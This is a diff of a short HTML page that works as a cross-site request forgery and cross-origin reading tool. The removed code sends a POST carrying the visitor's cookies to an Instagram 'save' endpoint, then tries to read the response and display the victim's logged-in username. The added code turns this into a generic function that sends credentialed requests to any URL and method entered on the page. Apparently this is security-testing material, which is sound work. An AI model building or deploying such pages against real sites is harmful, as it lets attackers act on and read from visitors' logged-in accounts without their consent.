@@ -2,16 +2,20 @@
 	<head></head>
 	<body><textarea></textarea><div style='display:none'></div><div class="username"></div></body>
 	<script>
-var x = new XMLHttpRequest(), username;
-x.open("POST","https://www.instagram.com/web/save/1939733107499854765/save/",true);
-x.withCredentials = true;
-x.onreadystatechange = function(){if(x.readyState ==4)
-	document.getElementsByTagName('textarea')[0].value = x.responseText;
-	document.getElementsByTagName('div')[0].innerHTML = x.responseText;
-	username = document.getElementsByClassName('-cx-PRIVATE-NavBar__username__')[0].innerHTML;
-	document.getElementsByClassName('username')[0].innerHTML = "You are logged in as "+username;
-};
-x.send();
-x.withCredentials = false;
-</script>
+		function loadPage(){
+			var url = document.getElementById('url').value, method = document.getElementById('method').value;
+			var x = new XMLHttpRequest();
+			x.open(method,url,true);
+			x.withCredentials = true;
+			x.onreadystatechange = function(){
+				x.withCredentials=false;
+				if(x.readyState ==4)
+				document.getElementsByTagName('textarea')[0].value = x.responseText;
+				//document.getElementsByTagName('div')[0].innerHTML = x.responseText;
+				//username = document.getElementsByClassName('-cx-PRIVATE-NavBar__username__')[0].innerHTML;
+				//document.getElementsByClassName('username')[0].innerHTML = "You are logged in as "+username;
+			};
+			x.send();
+		}
+	</script>
 </html>
